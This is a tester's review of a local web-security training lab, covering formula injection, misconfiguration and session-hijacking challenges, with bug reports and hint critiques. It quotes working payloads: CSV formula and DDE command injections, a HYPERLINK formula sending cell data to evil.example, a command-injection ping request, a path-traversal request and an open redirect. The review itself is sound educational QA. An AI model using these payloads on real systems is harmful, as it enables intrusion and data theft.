# Student Review: Grinder Nadia (intermediate-08)

Persona: intermediate student. Knows XSS/SQLi basics and Burp fundamentals. Tested against the shared pool at 127.0.0.1:18403 with a unique cookie jar, one burst at a time.

- Modules tested: formula (4/4 flags: Classic Formula Injection, DDE Command Execution, HYPERLINK Exfiltration, Pipe Prefix), misconfig (10/10 flags: debug, backup, listing, git, swp, trace, env, manager, robots, put), session (6/6 flags: fixation, logout, predictable, url, never-expires, log-leak). Final personal score: 20/201 from these modules plus 3 more from the SOLUTIONS.md spot checks.

- What worked well:
  - Formula module: the single shared /formula/export.csv endpoint classifies all four payload types correctly. Payloads: `=cmd|'/c calc'!A0`, `=DDE("cmd";"/c calc";"!A0")`, `=HYPERLINK("http://evil.example/?d="&A1,"click")`, `|/usr/bin/id`. The X-Flags response header makes the win obvious, and the accumulated header shows every captured formula flag at a glance. The briefing honestly states quoting is not sanitization, which is exactly the lesson.
  - Session module: every lab genuinely breaks a different session mechanism, and each one required the exact technique promised by its name. Fixation kept my pre-login sid (attacker123) across login; logout left /logoutdemo/secret reachable with the old cookie after /logoutdemo/home returned 403; predictable handed me sid 1000 with the admin's 1001 printed beside it; the proxy log leaked the admin's home?sid URL; the archive handed over the decade-old sid; the debug log printed the admin's sid line.
  - Misconfig: tight, self-contained, no wasted steps. trace worked with a raw TRACE verb, PUT uploaded with one request and read back on the next, the git object walk (HEAD -> refs/heads/main -> objects/a1/...) worked exactly as the hint ladder describes.
  - Awards are idempotent: replaying the fixation login returned the flag again but the scoreboard stayed put. No double counting.
  - Cheat resistance on the core flows is solid: fixation login without a preset cookie awarded nothing (page explains you logged in without a pre-set sid), predictable/admin as a guest 403s, leak-admin with no cookie 403s.

- Bugs found (with reproduction):
  1. **Formula cross-visitor free ride (free flags, no exploit needed).** Repro: fresh cookie jar -> POST /formula/add with a totally benign name -> GET /formula/export.csv -> X-Flags awarded all four formula flags, because the export classifies every row in the shared table, including payloads other testers inserted earlier. A student on this shared pool can collect all four formula flags without ever writing a payload. On a private instance this is harmless; on the shared pool it is free credit. Suggested fix: only classify cells added by the requesting visitor's own session, or clear the table per visitor.
  2. **PUT free ride variant.** Same root cause: uploadedFiles is module-global and GET /misconfig/files/<name> awards put to anyone who reads a PUT-uploaded file, so another student's PUT file (e.g. the pwn-*.txt files already sitting in public-files) awards the flag to a reader who never sent a PUT. Also, uploadedFiles is in-memory only: after a server restart, old PUT files stay on disk but are no longer in the set, so their GET stops awarding put while new PUTs keep working. Inconsistent across restarts.
  3. **Wrong port in `start` instructions.** 12 of the 20 challenge files in these modules hardcode `http://localhost:3000` (session: url, predictable, never-expires, logout; misconfig: trace, swp, robots, manager, listing, git, debug, backup). The shared pool runs on 18403, so following the starting point literally fails. Students will figure out the substitution, but it costs confusion at exactly the moment they are trying to get oriented.
  4. **Logout challenge has an inconsistent authz check.** After logout, /logoutdemo/home returns 403 but /logoutdemo/secret stays reachable with the old cookie. That is the intended vuln, but the inconsistency is never explained, so a careful student may conclude the lab is buggy rather than broken-by-design. One line in the lab text ("notice the home page blocks you but the secret page does not") would teach the lesson instead of breeding doubt.
  5. **Git challenge award is invisible.** Fetching the commit object returns the diff with the token redacted and no flag marker on the page; the only confirmation is the scoreboard count going up. Every other misconfig lab either prints the flag or shows a flag box. A student who walks the object store correctly sees redacted text and reasonably thinks they failed.

- Friction/confusion points:
  - The `backup.sql` dump and `secret.txt` both contain the literal string PENTRIX{DECOY_DO_NOT_USE}. The lab awards the flag on the request itself, so the decoy never reaches the scoreboard, but a student copy-pasting the decoy into a quiz box gets a wrong answer through no fault of their own. The decoy teaches "verify through the lab", which is fine, but it is a trap for the hurried.
  - The git diff redaction (see bug 5) plus the decoy strings make misconfig feel slightly adversarial rather than instructional in two spots.
  - Formula-hyperlink's `how` says "pointing at an external address" while the classifier only checks the =HYPERLINK( prefix; any URL works. Harmless, but the extra detail invites overthinking.
  - Curl quirk worth knowing (not a lab bug): combining -b jar with -H "Cookie: ..." made the jar's lab_sid win over my explicit override, producing 403s until I built the Cookie header manually from the jar's connect.sid. In Burp Repeater this never happens, but curl testers will hit it.

- Hint quality (helpful? spoilery? useless?):
  - Helpful overall. Every one of the 20 challenges has a real 3-level ladder, and the levels escalate correctly: level 1 is a nudge, level 2 names the technique, level 3 sketches the payload shape without handing over copy-paste exploits.
  - Best: formula-dde (level 2 explains DDE's three arguments, level 3 explains the quoting trap), trace (one sentence, exactly what to do), put (gives the header and body requirements).
  - Borderline spoilery: predictable's single-line hint says the admin's sid sits right next to yours, which is true of the page itself, so the "exploit" is reading the page. That is the intended lesson (predictable ids), so I call it fair, not spoilery.
  - Weakest: formula-pipe level 3 ("anchored by a cell reference, the same pattern as the other formula challenges") gestures at a payload shape that is not actually required; a bare `|/usr/bin/id` awards it. The hint overcomplicates what is the simplest payload of the four.
  - misconfig debug's single-line hint is a wall of text that tries to be all three ladder levels at once; splitting it would read better.

- Difficulty fairness:
  - formula: Easy x3, Medium x1 (hyperlink). Fair. The four payload types are genuinely distinct and the classifier rewards each.
  - misconfig: 7 Easy, 3 Medium (git, env, put). Mostly fair. git deserves Medium (multi-step walk). env is labeled Medium but is a single GET for /.env; that is Easy work and the label may scare beginners off a free flag. put deserves Medium (method + headers + body).
  - session: 3 Easy (logout, url, never-expires), 3 Medium (fixation, predictable, log-leak). Fair. predictable is really "Easy with a twist" since the page prints both sids, but Medium is defensible because the student must still do the cookie swap. fixation's Medium is earned: the two-step mental model (fix, then victim logs in) is the actual lesson.
  - Nothing here felt unfair or guessy. Every flag had a discoverable path from the briefing plus the ladder.

- Burp-first feasibility:
  - Fully feasible. All 20 challenges map cleanly to Proxy/Repeater: intercept the add-contact POST, edit params in Repeater, read response headers (X-Flags) and bodies. The only verb outside normal browsing is TRACE, which Repeater sends fine. No challenge needed Intruder, Decoder, or extensions, though predictable explicitly suggests Intruder as an alternative, which is nice for teaching.
  - The session module briefing's "use a cookie jar" advice is the curl equivalent of keeping one Burp browser session, and it matters: mixing identities breaks the fixation and predictable flows exactly the way mixing browsers would.

- Suggestions (concrete):
  1. Scope formula classification and the PUT award to the requesting visitor's own rows/uploads, so shared-pool students cannot free-ride each other's flags (bugs 1 and 2).
  2. Replace the hardcoded localhost:3000 in `start` fields with a relative instruction ("open /session/urldemo on this lab's host and port") or inject the actual base URL at render time.
  3. Show a flag box (or at least a success banner) on the git commit-object response instead of a redacted diff with silent scoreboard credit.
  4. Add one sentence to the logout lab noting that /home correctly rejects the dead session while /secret does not, so students read it as the intended vuln.
  5. Downgrade env to Easy, or keep Medium and say why (it is about knowing the filename exists, not about the request).
  6. Rewrite formula-pipe hint level 3 to match the actual requirement (leading pipe is enough), and split the debug single-line hint into the 3-level ladder the other challenges have.

- SOLUTIONS.md accuracy (spot-checked 4 documented solutions against the live lab):
  1. **lfi path traversal (#1, `GET /lfi/view?file=..%2Fdocs%2Fsecret.txt`): ACCURATE.** Route exists, the verbatim request returned the secret marker and the lab awarded the flag.
  2. **cmdi ping gadget basic (#1, `GET /cmdi/ping?host=127.0.0.1;id`): ACCURATE.** Route exists, the verbatim request returned the injected command's output and the lab awarded the flag.
  3. **idor profile access (#1, `GET /idor/login/alice` then `GET /idor/users/1`): ACCURATE.** Login route exists (302), the profile request returned the admin's profile and the lab awarded the flag. Note: the doc's curl examples use `http://localhost:3000`; on this pool the port must be adapted, but the routes and steps are correct.
  4. **redirect open-redirect (#1, `GET /redirect/go?next=//evil.com`): ACCURATE.** Returned 302 with `Location: //evil.com` and the lab awarded the flag. All five documented redirect routes exist (/go, /js, /data, /trusted, /polluted); the doc's example port (3109) differs from the pool port, but the request works verbatim once the port is adapted.

- Rating: 4
